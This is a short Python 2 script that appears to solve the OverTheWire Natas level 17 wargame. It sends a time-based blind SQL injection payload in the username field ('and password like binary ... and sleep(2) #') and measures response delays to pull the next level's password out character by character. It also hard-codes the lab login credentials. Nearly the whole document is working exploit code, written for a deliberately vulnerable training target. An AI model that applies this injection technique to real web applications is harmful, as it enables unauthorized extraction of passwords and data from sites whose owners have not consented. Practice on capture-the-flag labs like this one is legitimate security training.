#!/usr/bin/python

import requests
from string import *
from time import *

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

letter = lowercase + uppercase + digits
auth = (username, password)
url = "http://natas17.natas.labs.overthewire.org/"

value = ""

for char in letter:
	start_time = time()
	data = {'debug' : '12', 'username' : 'natas18" and password  like binary \'%' + char + '%\' and sleep(2) #'}
	req = requests.post(url, data = data, auth = auth)
	end_time = time()
	difference = end_time - start_time
	if difference > 2:
		value += char
		print value


passw = ""

while(1):
	for char in value:
		start_time = time()
		data = {'debug' : '12', 'username' : 'natas18" and password  like binary \'' + passw + char + '%\' and sleep(2) #'}
		req = requests.post(url, data = data, auth = auth)
		end_time = time()
		difference = end_time - start_time
		if difference > 2:
			passw += char
			print passw
			break
